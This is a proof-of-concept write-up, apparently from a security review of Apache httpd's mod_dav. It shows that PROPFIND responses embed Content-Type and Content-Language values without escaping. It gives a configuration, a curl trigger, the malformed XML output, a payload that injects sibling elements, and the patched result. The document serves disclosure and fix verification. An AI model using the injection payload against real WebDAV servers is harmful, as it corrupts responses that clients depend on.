# PoC 056 — DAV PROPFIND response embeds unescaped Content-Type / Content-Language

`dav_insert_coreprop()` concatenates `DAV:getcontenttype` and
`DAV:getcontentlanguage` straight into the response XML. Subrequest
metadata containing `<`, `>`, or `&` corrupts the multistatus response.

## Setup

Build with `mod_dav` and `mod_dav_fs`:

```
./configure --enable-dav --enable-dav-fs \
            --with-mpm=event --enable-mods-static=few
make -j4
```

`httpd.conf`:

```
Listen 127.0.0.1:8080
LoadModule dav_module    modules/mod_dav.so
LoadModule dav_fs_module modules/mod_dav_fs.so
LoadModule mime_module   modules/mod_mime.so
LoadModule headers_module modules/mod_headers.so
ServerName localhost

DAVLockDB /tmp/davlock
DocumentRoot /var/www/dav

<Directory /var/www/dav>
    DAV On
    Options +Indexes
    Require all granted
</Directory>

# Force a Content-Type containing XML metacharacters via mod_mime + AddType.
# AddType accepts arbitrary tokens for the type string.
AddType "text/x<foo;charset=\"a&b\"" .poc

# Force a Content-Language containing metacharacters via mod_headers.
<Files "lang.poc">
    Header always set Content-Language "en<x>"
</Files>
```

Create the test resource:

```
mkdir -p /var/www/dav
echo hi > /var/www/dav/lang.poc
```

## Trigger

Issue a PROPFIND that requests the two affected core properties:

```
curl -i -X PROPFIND http://127.0.0.1:8080/lang.poc \
     -H 'Depth: 0' \
     -H 'Content-Type: text/xml' \
     --data-binary @- <<'XML'
<?xml version="1.0" encoding="utf-8"?>
<D:propfind xmlns:D="DAV:">
  <D:prop>
    <D:getcontenttype/>
    <D:getcontentlanguage/>
  </D:prop>
</D:propfind>
XML
```

## Observed effect

Response body contains malformed XML, broken at the unescaped `<`:

```
<D:getcontenttype>text/x<foo;charset="a&b"</D:getcontenttype>
<D:getcontentlanguage>en<x></D:getcontentlanguage>
```

Validate with any XML parser:

```
curl -s -X PROPFIND ... | xmllint --noout -
# error : StartTag: invalid element name
# Opening and ending tag mismatch: getcontenttype line 1 and foo
```

A DAV client (`cadaver`, `litmus`, GVFS) prints a parse error and aborts
the listing. Stronger payloads (e.g.
`text/plain</D:getcontenttype><D:displayname>injected`) inject sibling
elements into the multistatus response.

## Log marker

`error_log` is silent (the response is structurally invalid but the server
considers the request handled). Detection is the structural mismatch
between the bytes in the response and a valid `D:multistatus` document.

Post-patch the same trigger emits

```
<D:getcontenttype>text/x&lt;foo;charset=&quot;a&amp;b&quot;</D:getcontenttype>
```

while `lockdiscovery` and `supportedlock` continue to emit XML fragments
verbatim.
